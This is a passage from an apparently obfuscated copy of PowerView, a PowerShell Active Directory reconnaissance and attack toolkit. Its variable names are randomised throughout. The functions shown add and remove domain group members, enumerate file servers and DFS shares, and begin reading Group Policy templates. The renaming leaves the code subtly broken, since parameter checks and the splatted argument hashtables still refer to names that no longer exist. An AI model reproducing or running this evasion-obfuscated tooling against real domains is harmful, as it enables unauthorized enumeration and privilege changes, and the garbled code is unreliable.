                        $HLkP8yYwFiBnjz2lL | Add-Member NoteProperty 'TimeFirstAdded' $L3iPh1Ap8zxlemWuFSNfUwQk.ftimeCreated
                        $HLkP8yYwFiBnjz2lL | Add-Member NoteProperty 'TimeDeleted' $L3iPh1Ap8zxlemWuFSNfUwQk.ftimeDeleted
                        $HLkP8yYwFiBnjz2lL | Add-Member NoteProperty 'LastOriginatingChange' $L3iPh1Ap8zxlemWuFSNfUwQk.ftimeLastOriginatingChange
                        $HLkP8yYwFiBnjz2lL | Add-Member NoteProperty 'TimesAdded' ($L3iPh1Ap8zxlemWuFSNfUwQk.dwVersion / 2)
                        $HLkP8yYwFiBnjz2lL | Add-Member NoteProperty 'LastOriginatingDsaDN' $L3iPh1Ap8zxlemWuFSNfUwQk.pszLastOriginatingDsaDN
                        $HLkP8yYwFiBnjz2lL.PSObject.TypeNames.Insert(0, 'PowerView.DomainGroupMemberDeleted')
                        $HLkP8yYwFiBnjz2lL
                    }
                }
                else {
                    Write-Verbose "[Get-DomainGroupMemberDeleted] Error retrieving 'msds-replvaluemetadata' for '$l2mBeiWJzV'"
                }
            }
        }
    }
}


function Add-DomainGroupMember {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $S,

        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $vLpXxy5J8BVMX8VjUelZ,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $N = @{
            'Identity' = $S
        }
        if ($PSBoundParameters['Domain']) { $N['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['Credential']) { $N['Credential'] = $3ezVSfm6f4k }

        $vlrO08DGxu7kCd6Mhn43K1 = Get-PrincipalContext @ContextArguments

        if ($vlrO08DGxu7kCd6Mhn43K1) {
            try {
                $BOr2NcFYpLPWHjdn8TXZQ4 = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($vlrO08DGxu7kCd6Mhn43K1.Context, $vlrO08DGxu7kCd6Mhn43K1.Identity)
            }
            catch {
                Write-Warning "[Add-DomainGroupMember] Error finding the group identity '$S' : $_"
            }
        }
    }

    PROCESS {
        if ($BOr2NcFYpLPWHjdn8TXZQ4) {
            ForEach ($jno in $vLpXxy5J8BVMX8VjUelZ) {
                if ($jno -match '.+\\.+') {
                    $N['Identity'] = $jno
                    $cPZErCtoD = Get-PrincipalContext @ContextArguments
                    if ($cPZErCtoD) {
                        $tHSPwRinjZ69gl0v5fMEQU = $cPZErCtoD.Identity
                    }
                }
                else {
                    $cPZErCtoD = $vlrO08DGxu7kCd6Mhn43K1
                    $tHSPwRinjZ69gl0v5fMEQU = $jno
                }
                Write-Verbose "[Add-DomainGroupMember] Adding member '$jno' to group '$S'"
                $jno = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($cPZErCtoD.Context, $tHSPwRinjZ69gl0v5fMEQU)
                $BOr2NcFYpLPWHjdn8TXZQ4.Members.Add($jno)
                $BOr2NcFYpLPWHjdn8TXZQ4.Save()
            }
        }
    }
}


function Remove-DomainGroupMember {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $S,

        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $vLpXxy5J8BVMX8VjUelZ,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $N = @{
            'Identity' = $S
        }
        if ($PSBoundParameters['Domain']) { $N['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['Credential']) { $N['Credential'] = $3ezVSfm6f4k }

        $vlrO08DGxu7kCd6Mhn43K1 = Get-PrincipalContext @ContextArguments

        if ($vlrO08DGxu7kCd6Mhn43K1) {
            try {
                $BOr2NcFYpLPWHjdn8TXZQ4 = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($vlrO08DGxu7kCd6Mhn43K1.Context, $vlrO08DGxu7kCd6Mhn43K1.Identity)
            }
            catch {
                Write-Warning "[Remove-DomainGroupMember] Error finding the group identity '$S' : $_"
            }
        }
    }

    PROCESS {
        if ($BOr2NcFYpLPWHjdn8TXZQ4) {
            ForEach ($jno in $vLpXxy5J8BVMX8VjUelZ) {
                if ($jno -match '.+\\.+') {
                    $N['Identity'] = $jno
                    $cPZErCtoD = Get-PrincipalContext @ContextArguments
                    if ($cPZErCtoD) {
                        $tHSPwRinjZ69gl0v5fMEQU = $cPZErCtoD.Identity
                    }
                }
                else {
                    $cPZErCtoD = $vlrO08DGxu7kCd6Mhn43K1
                    $tHSPwRinjZ69gl0v5fMEQU = $jno
                }
                Write-Verbose "[Remove-DomainGroupMember] Removing member '$jno' from group '$S'"
                $jno = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($cPZErCtoD.Context, $tHSPwRinjZ69gl0v5fMEQU)
                $BOr2NcFYpLPWHjdn8TXZQ4.Members.Remove($jno)
                $BOr2NcFYpLPWHjdn8TXZQ4.Save()
            }
        }
    }
}


function Get-DomainFileServer {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $c7rZO2V9,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $h2yNsAt,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        function Split-a9LvymtQdGPNr8cqgsI {
            
            Param([String]$a9LvymtQdGPNr8cqgsI)

            if ($a9LvymtQdGPNr8cqgsI -and ($a9LvymtQdGPNr8cqgsI.split('\\').Count -ge 3)) {
                $oQcVuwRs2DTWSX1 = $a9LvymtQdGPNr8cqgsI.split('\\')[2]
                if ($oQcVuwRs2DTWSX1 -and ($oQcVuwRs2DTWSX1 -ne '')) {
                    $oQcVuwRs2DTWSX1
                }
            }
        }

        $wtWPex5R = @{
            'LDAPFilter' = '(&(samAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(|(homedirectory=*)(scriptpath=*)(profilepath=*)))'
            'Properties' = 'homedirectory,scriptpath,profilepath'
        }
        if ($PSBoundParameters['SearchBase']) { $wtWPex5R['SearchBase'] = $h2yNsAt }
        if ($PSBoundParameters['Server']) { $wtWPex5R['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $wtWPex5R['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $wtWPex5R['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $wtWPex5R['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $wtWPex5R['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $wtWPex5R['Credential'] = $3ezVSfm6f4k }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            ForEach ($l6OxARucBpbqH124jLlwS in $3Ecdwi8qNy) {
                $wtWPex5R['Domain'] = $l6OxARucBpbqH124jLlwS
                $XK77F5ap = Get-DomainSearcher @SearcherArguments
                
                $(ForEach($bm in $XK77F5ap.FindAll()) {if ($bm.Properties['homedirectory']) {Split-a9LvymtQdGPNr8cqgsI($bm.Properties['homedirectory'])}if ($bm.Properties['scriptpath']) {Split-a9LvymtQdGPNr8cqgsI($bm.Properties['scriptpath'])}if ($bm.Properties['profilepath']) {Split-a9LvymtQdGPNr8cqgsI($bm.Properties['profilepath'])}}) | Sort-Object -Unique
            }
        }
        else {
            $XK77F5ap = Get-DomainSearcher @SearcherArguments
            $(ForEach($bm in $XK77F5ap.FindAll()) {if ($bm.Properties['homedirectory']) {Split-a9LvymtQdGPNr8cqgsI($bm.Properties['homedirectory'])}if ($bm.Properties['scriptpath']) {Split-a9LvymtQdGPNr8cqgsI($bm.Properties['scriptpath'])}if ($bm.Properties['profilepath']) {Split-a9LvymtQdGPNr8cqgsI($bm.Properties['profilepath'])}}) | Sort-Object -Unique
        }
    }
}


function Get-DomainDFSShare {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $h2yNsAt,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        $ie3v8TMftUHu = 'All'
    )

    BEGIN {
        $wtWPex5R = @{}
        if ($PSBoundParameters['SearchBase']) { $wtWPex5R['SearchBase'] = $h2yNsAt }
        if ($PSBoundParameters['Server']) { $wtWPex5R['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $wtWPex5R['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $wtWPex5R['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $wtWPex5R['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $wtWPex5R['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $wtWPex5R['Credential'] = $3ezVSfm6f4k }

        function Parse-Pkt {
            [CmdletBinding()]
            Param(
                [Byte[]]
                $afhgYv9eg8n
            )

            $GVSBRh3CW0uMQ = $afhgYv9eg8n
            $lkuRUptO7f = [bitconverter]::ToUInt32($GVSBRh3CW0uMQ[0..3],0)
            $FvGo3IPykDqr = [bitconverter]::ToUInt32($GVSBRh3CW0uMQ[4..7],0)
            $2iCxJSbEZDQFphllc9F = 8
            
            $XleFWd9nz7E8xmy = @()
            for($RGKU3QpH=1; $RGKU3QpH -le $FvGo3IPykDqr; $RGKU3QpH++){
                $gHXAl = $2iCxJSbEZDQFphllc9F
                $Qzm3XrvAmZKaHbtc2xKb3 = $2iCxJSbEZDQFphllc9F + 1
                $hTdf6RoZj8FGk = [bitconverter]::ToUInt16($GVSBRh3CW0uMQ[$gHXAl..$Qzm3XrvAmZKaHbtc2xKb3],0)

                $snbuX1Fmw5BGc = $Qzm3XrvAmZKaHbtc2xKb3 + 1
                $ueXbgJ = $snbuX1Fmw5BGc + $hTdf6RoZj8FGk - 1
                $dHpDjB7q2u306NHdU = [System.Text.Encoding]::Unicode.GetString($GVSBRh3CW0uMQ[$snbuX1Fmw5BGc..$ueXbgJ])

                $EVCICcHPDJ3ho6e1Ut20 = $ueXbgJ + 1
                $D6dt0U7yngX4LFKkIsYxJlr = $EVCICcHPDJ3ho6e1Ut20 + 3
                $MhZRqLKRbNj = [bitconverter]::ToUInt32($GVSBRh3CW0uMQ[$EVCICcHPDJ3ho6e1Ut20..$D6dt0U7yngX4LFKkIsYxJlr],0)

                $Wdxs23wSJJNZMkAuWZA87WKbe = $D6dt0U7yngX4LFKkIsYxJlr + 1
                $28wiXQ1rTyOofMVEH3GALx0 = $Wdxs23wSJJNZMkAuWZA87WKbe + $MhZRqLKRbNj - 1
                $UgNp1H6GTZz = $GVSBRh3CW0uMQ[$Wdxs23wSJJNZMkAuWZA87WKbe..$28wiXQ1rTyOofMVEH3GALx0]
                switch -wildcard ($dHpDjB7q2u306NHdU) {
                    "\siteroot" {  }
                    "\domainroot*" {
                        
                        
                        $l4hqyVpKcv9dDPmbCOLT = 0
                        $Ik = 15
                        $t0fz2he = [byte[]]$UgNp1H6GTZz[$l4hqyVpKcv9dDPmbCOLT..$Ik]
                        $5po0qFi4I = New-Object Guid(,$t0fz2he) 
                        $O8QISqxMJUZeWH = $Ik + 1
                        $HhfOkpBvrPdU7LVb8RsDG12ZT = $O8QISqxMJUZeWH + 1
                        $7ILe65T = [bitconverter]::ToUInt16($UgNp1H6GTZz[$O8QISqxMJUZeWH..$HhfOkpBvrPdU7LVb8RsDG12ZT],0)
                        $4DG2jDacZ1zo76dVUG = $HhfOkpBvrPdU7LVb8RsDG12ZT + 1
                        $u0rFsXQSVZhD1wq2UbimHgkT = $4DG2jDacZ1zo76dVUG + $7ILe65T - 1
                        $yeX9Wp8R4YasRBU = [System.Text.Encoding]::Unicode.GetString($UgNp1H6GTZz[$4DG2jDacZ1zo76dVUG..$u0rFsXQSVZhD1wq2UbimHgkT])

                        $short_prefix_size_startZvsw5fWBqS = $u0rFsXQSVZhD1wq2UbimHgkT + 1
                        $Buo9hwJtMiev5FKa = $short_prefix_size_startZvsw5fWBqS + 1
                        $BJUx = [bitconverter]::ToUInt16($UgNp1H6GTZz[$short_prefix_size_startZvsw5fWBqS..$Buo9hwJtMiev5FKa],0)
                        $B = $Buo9hwJtMiev5FKa + 1
                        $cN5kWKhVMTsO = $B + $BJUx - 1
                        $o60DZZCRZaI1SaVTD = [System.Text.Encoding]::Unicode.GetString($UgNp1H6GTZz[$B..$cN5kWKhVMTsO])

                        $BpXUAMwfi = $cN5kWKhVMTsO + 1
                        $bxFfwv7TUkYeqR9PL = $BpXUAMwfi + 3
                        $fK67iX = [bitconverter]::ToUInt32($UgNp1H6GTZz[$BpXUAMwfi..$bxFfwv7TUkYeqR9PL],0)

                        $upZdAzFUUmJ = $bxFfwv7TUkYeqR9PL + 1
                        $UlEYwGW7Bn = $upZdAzFUUmJ + 3
                        $9AI523Owv48doetl = [bitconverter]::ToUInt32($UgNp1H6GTZz[$upZdAzFUUmJ..$UlEYwGW7Bn],0)

                        $dWamGkzLZ27sjwB = $UlEYwGW7Bn + 1
                        $BehYUKv4QATzg2SohdiGRH0 = $dWamGkzLZ27sjwB + 1
                        $comment_sizeRe = [bitconverter]::ToUInt16($UgNp1H6GTZz[$dWamGkzLZ27sjwB..$BehYUKv4QATzg2SohdiGRH0],0)
                        $5GDI = $BehYUKv4QATzg2SohdiGRH0 + 1
                        $adUOv5RvcdCzXIJZBFMB = $5GDI + $comment_sizeRe - 1
                        if ($comment_sizeRe -gt 0)  {
                            $XW3iRlBb25ACaAzz5ijVkVYZD = [System.Text.Encoding]::Unicode.GetString($UgNp1H6GTZz[$5GDI..$adUOv5RvcdCzXIJZBFMB])
                        }
                        $KevMV5LXfTqy4 = $adUOv5RvcdCzXIJZBFMB + 1
                        $TWGqcSm = $KevMV5LXfTqy4 + 7
                        
                        $YTTtPSVWTqQchgtBvMImulP = $UgNp1H6GTZz[$KevMV5LXfTqy4..$TWGqcSm] 
                        $Ryk6HqjXbc = $TWGqcSm + 1
                        $FeSHqfOY1jCCSINT0l = $Ryk6HqjXbc + 7
                        $5T1cr3vP = $UgNp1H6GTZz[$Ryk6HqjXbc..$FeSHqfOY1jCCSINT0l]
                        $MTLkEG6R4CJx7 = $FeSHqfOY1jCCSINT0l + 1
                        $ryiEkAd5paObTh = $MTLkEG6R4CJx7 + 7
                        $L2YkPo1A = $UgNp1H6GTZz[$MTLkEG6R4CJx7..$ryiEkAd5paObTh]
                        $version_start = $ryiEkAd5paObTh  + 1
                        $2dMDcTgzGxENvbo = $version_start + 3
                        $ie3v8TMftUHu = [bitconverter]::ToUInt32($UgNp1H6GTZz[$version_start..$2dMDcTgzGxENvbo],0)

                        
                        $f2dc9YgXDpny4SUELba = $2dMDcTgzGxENvbo + 1
                        $Xb11V7RyBNBQ = $f2dc9YgXDpny4SUELba + 3
                        $UkNTW94XIVLFzf1Bma = [bitconverter]::ToUInt32($UgNp1H6GTZz[$f2dc9YgXDpny4SUELba..$Xb11V7RyBNBQ],0)

                        $11SjwEezcPdv9ziu = $Xb11V7RyBNBQ + 1
                        $MEdwaG4KFb0AscSzTJ1hNv7L = $11SjwEezcPdv9ziu + $UkNTW94XIVLFzf1Bma - 1
                        $fo78g8Gw0oabPKtF2 = $UgNp1H6GTZz[$11SjwEezcPdv9ziu..$MEdwaG4KFb0AscSzTJ1hNv7L]
                        $3FqfsoRy80Ja = $MEdwaG4KFb0AscSzTJ1hNv7L + 1
                        $l5f1ZhcaOYEyHi4TWGP0dgR3C = $3FqfsoRy80Ja + 3
                        $YnX = [bitconverter]::ToUInt32($UgNp1H6GTZz[$3FqfsoRy80Ja..$l5f1ZhcaOYEyHi4TWGP0dgR3C],0)

                        $7CTo0QmxZPYaiy = $l5f1ZhcaOYEyHi4TWGP0dgR3C + 1
                        $8ik6AeyFZ = $7CTo0QmxZPYaiy + $YnX - 1
                        $156YXH = $UgNp1H6GTZz[$7CTo0QmxZPYaiy..$8ik6AeyFZ]
                        $Dhvrb3A7tYU6aGSJ594 = $8ik6AeyFZ + 1
                        $UcLwPzuhXRkM = $Dhvrb3A7tYU6aGSJ594 + 3
                        $jmUeXbGn7grkcC61f = [bitconverter]::ToUInt32($UgNp1H6GTZz[$Dhvrb3A7tYU6aGSJ594..$UcLwPzuhXRkM],0)

                        
                        $STfZagAA6 = 0
                        $6fD0qnZKgvayFA9sojpx = $STfZagAA6 + 3
                        $PYGnymt0zvxwWDTH3rMq = [bitconverter]::ToUInt32($fo78g8Gw0oabPKtF2[$STfZagAA6..$6fD0qnZKgvayFA9sojpx],0)
                        $klyXjKgf5RtYvAMUJx = $6fD0qnZKgvayFA9sojpx + 1

                        for($Vua0bikU53=1; $Vua0bikU53 -le $PYGnymt0zvxwWDTH3rMq; $Vua0bikU53++){
                            $KD04elmO = $klyXjKgf5RtYvAMUJx
                            $B9TVNYjOqWA1npkJ0 = $KD04elmO + 3
                            $fJA1mHbVPg = [bitconverter]::ToUInt32($fo78g8Gw0oabPKtF2[$KD04elmO..$B9TVNYjOqWA1npkJ0],0)
                            $j1Vzdqx2MnPNu = $B9TVNYjOqWA1npkJ0 + 1
                            $uwurCMqPnVVdnFQ5PLoWxLri = $j1Vzdqx2MnPNu + 7
                            
                            $TQ9CzM5 = $fo78g8Gw0oabPKtF2[$j1Vzdqx2MnPNu..$uwurCMqPnVVdnFQ5PLoWxLri]
                            $9pk2xmFDalPN = $uwurCMqPnVVdnFQ5PLoWxLri + 1
                            $Jnz1chZEBASoI3tDwOHF0vG5g = $9pk2xmFDalPN + 3
                            $j = [bitconverter]::ToUInt32($fo78g8Gw0oabPKtF2[$9pk2xmFDalPN..$Jnz1chZEBASoI3tDwOHF0vG5g],0)

                            $vYaRGO0r28tisQH = $Jnz1chZEBASoI3tDwOHF0vG5g + 1
                            $2 = $vYaRGO0r28tisQH + 3
                            $yFNr94BC83Pn = [bitconverter]::ToUInt32($fo78g8Gw0oabPKtF2[$vYaRGO0r28tisQH..$2],0)

                            $W2 = $2 + 1
                            $uhPnG0cD6XaUq9d2x3CwZep7L = $W2 + 1
                            $C9ZqQu45B = [bitconverter]::ToUInt16($fo78g8Gw0oabPKtF2[$W2..$uhPnG0cD6XaUq9d2x3CwZep7L],0)

                            $UE2iN = $uhPnG0cD6XaUq9d2x3CwZep7L + 1
                            $4Vvhk = $UE2iN + $C9ZqQu45B - 1
                            $ZmekVvetrj = [System.Text.Encoding]::Unicode.GetString($fo78g8Gw0oabPKtF2[$UE2iN..$4Vvhk])

                            $Xnps26oAonVap8ycCFRK4VK = $4Vvhk + 1
                            $quNj3Jgl = $Xnps26oAonVap8ycCFRK4VK + 1
                            $uzZCbp2mOA = [bitconverter]::ToUInt16($fo78g8Gw0oabPKtF2[$Xnps26oAonVap8ycCFRK4VK..$quNj3Jgl],0)
                            $GGS1hk9imL6ShpX13PDmf = $quNj3Jgl + 1
                            $vR8LlL = $GGS1hk9imL6ShpX13PDmf + $uzZCbp2mOA - 1
                            $9RMIp5B13WmCl = [System.Text.Encoding]::Unicode.GetString($fo78g8Gw0oabPKtF2[$GGS1hk9imL6ShpX13PDmf..$vR8LlL])

                            $SRWjzA83O += "\\$ZmekVvetrj\$9RMIp5B13WmCl"
                            $klyXjKgf5RtYvAMUJx = $vR8LlL + 1
                        }
                    }
                }
                $2iCxJSbEZDQFphllc9F = $28wiXQ1rTyOofMVEH3GALx0 + 1
                $TdhxKrUXj = @{
                    'Name' = $dHpDjB7q2u306NHdU
                    'Prefix' = $yeX9Wp8R4YasRBU
                    'TargetList' = $SRWjzA83O
                }
                $XleFWd9nz7E8xmy += New-Object -TypeName PSObject -Property $TdhxKrUXj
                $yeX9Wp8R4YasRBU = $qYFR5PCZruUkdna9T
                $dHpDjB7q2u306NHdU = $qYFR5PCZruUkdna9T
                $SRWjzA83O = $qYFR5PCZruUkdna9T
            }

            $6T0Vp21m9WAPn = @()
            $XleFWd9nz7E8xmy | ForEach-Object {
                if ($_.TargetList) {
                    $_.TargetList | ForEach-Object {
                        $6T0Vp21m9WAPn += $_.split('\')[2]
                    }
                }
            }

            $6T0Vp21m9WAPn
        }

        function Get-DomainDFSShareV1 {
            [CmdletBinding()]
            Param(
                [String]
                $3Ecdwi8qNy,

                [String]
                $h2yNsAt,

                [String]
                $Gkd0Hz5f,

                [String]
                $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

                [Int]
                $dTP7Qv6RslNUx = 200,

                [Int]
                $OVoMgsOXRJJ7,

                [Switch]
                $jVcDk0Ocw0TgdcVV8Sq,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
            )

            $ekGk2GzqJQZt = Get-DomainSearcher @PSBoundParameters

            if ($ekGk2GzqJQZt) {
                $m7vMGWDKaYZNdqkRxnsB = @()
                $ekGk2GzqJQZt.filter = '(&(objectClass=fTDfs))'

                try {
                    $nhxRs5G1 = $ekGk2GzqJQZt.FindAll()
                    $nhxRs5G1 | Where-Object {$_} | ForEach-Object {
                        $UtHQ = $_.Properties
                        $gJmClNn5DTFhaA = $UtHQ.remoteservername
                        $afhgYv9eg8n = $UtHQ.pkt

                        $m7vMGWDKaYZNdqkRxnsB += $gJmClNn5DTFhaA | ForEach-Object {
                            try {
                                if ( $_.Contains('\') ) {
                                    New-Object -TypeName PSObject -Property @{'Name'=$UtHQ.name[0];'RemoteServerName'=$_.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV1 error in parsing DFS share : $_"
                            }
                        }
                    }
                    if ($nhxRs5G1) {
                        try { $nhxRs5G1.dispose() }
                        catch {
                            Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV1 error disposing of the Results object: $_"
                        }
                    }
                    $ekGk2GzqJQZt.dispose()

                    if ($afhgYv9eg8n -and $afhgYv9eg8n[0]) {
                        Parse-Pkt $afhgYv9eg8n[0] | ForEach-Object {
                            
                            
                            
                            if ($_ -ne 'null') {
                                New-Object -TypeName PSObject -Property @{'Name'=$UtHQ.name[0];'RemoteServerName'=$_}
                            }
                        }
                    }
                }
                catch {
                    Write-Warning "[Get-DomainDFSShare] Get-DomainDFSShareV1 error : $_"
                }
                $m7vMGWDKaYZNdqkRxnsB | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }

        function Get-DomainDFSShareV2 {
            [CmdletBinding()]
            Param(
                [String]
                $3Ecdwi8qNy,

                [String]
                $h2yNsAt,

                [String]
                $Gkd0Hz5f,

                [String]
                $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

                [Int]
                $dTP7Qv6RslNUx = 200,

                [Int]
                $OVoMgsOXRJJ7,

                [Switch]
                $jVcDk0Ocw0TgdcVV8Sq,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
            )

            $ekGk2GzqJQZt = Get-DomainSearcher @PSBoundParameters

            if ($ekGk2GzqJQZt) {
                $m7vMGWDKaYZNdqkRxnsB = @()
                $ekGk2GzqJQZt.filter = '(&(objectClass=msDFS-Linkv2))'
                $qYFR5PCZruUkdna9T = $ekGk2GzqJQZt.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))

                try {
                    $nhxRs5G1 = $ekGk2GzqJQZt.FindAll()
                    $nhxRs5G1 | Where-Object {$_} | ForEach-Object {
                        $UtHQ = $_.Properties
                        $SRWjzA83O = $UtHQ.'msdfs-targetlistv2'[0]
                        $NlY4ymS2gAWtLXsFIBJn = [xml][System.Text.Encoding]::Unicode.GetString($SRWjzA83O[2..($SRWjzA83O.Length-1)])
                        $m7vMGWDKaYZNdqkRxnsB += $NlY4ymS2gAWtLXsFIBJn.targets.ChildNodes | ForEach-Object {
                            try {
                                $gFt2yrIHU = $_.InnerText
                                if ( $gFt2yrIHU.Contains('\') ) {
                                    $DuCyW8 = $gFt2yrIHU.split('\')[3]
                                    $UBPvh3abyHOtNqx = $UtHQ.'msdfs-linkpathv2'[0]
                                    New-Object -TypeName PSObject -Property @{'Name'="$DuCyW8$UBPvh3abyHOtNqx";'RemoteServerName'=$gFt2yrIHU.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV2 error in parsing target : $_"
                            }
                        }
                    }
                    if ($nhxRs5G1) {
                        try { $nhxRs5G1.dispose() }
                        catch {
                            Write-Verbose "[Get-DomainDFSShare] Error disposing of the Results object: $_"
                        }
                    }
                    $ekGk2GzqJQZt.dispose()
                }
                catch {
                    Write-Warning "[Get-DomainDFSShare] Get-DomainDFSShareV2 error : $_"
                }
                $m7vMGWDKaYZNdqkRxnsB | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }
    }

    PROCESS {
        $m7vMGWDKaYZNdqkRxnsB = @()

        if ($PSBoundParameters['Domain']) {
            ForEach ($l6OxARucBpbqH124jLlwS in $3Ecdwi8qNy) {
                $wtWPex5R['Domain'] = $l6OxARucBpbqH124jLlwS
                if ($ie3v8TMftUHu -match 'all|1') {
                    $m7vMGWDKaYZNdqkRxnsB += Get-DomainDFSShareV1 @SearcherArguments
                }
                if ($ie3v8TMftUHu -match 'all|2') {
                    $m7vMGWDKaYZNdqkRxnsB += Get-DomainDFSShareV2 @SearcherArguments
                }
            }
        }
        else {
            if ($ie3v8TMftUHu -match 'all|1') {
                $m7vMGWDKaYZNdqkRxnsB += Get-DomainDFSShareV1 @SearcherArguments
            }
            if ($ie3v8TMftUHu -match 'all|2') {
                $m7vMGWDKaYZNdqkRxnsB += Get-DomainDFSShareV2 @SearcherArguments
            }
        }

        $m7vMGWDKaYZNdqkRxnsB | Sort-Object -Property ('RemoteServerName','Name') -Unique
    }
}








function Get-GptTmpl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('gpcfilesyspath', 'Path')]
        [String]
        $GptTmplPaths5KWSPKFJ6,

        [Switch]
        $Nb4fuJEvKYU1GcgpTP,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $YwI3tSLWxcN90OI = @{}
    }

    PROCESS {
        try {
            if (($GptTmplPaths5KWSPKFJ6 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $eaHDqmUVFpRkx = "\\$((New-Object System.Uri($GptTmplPaths5KWSPKFJ6)).Host)\SYSVOL"
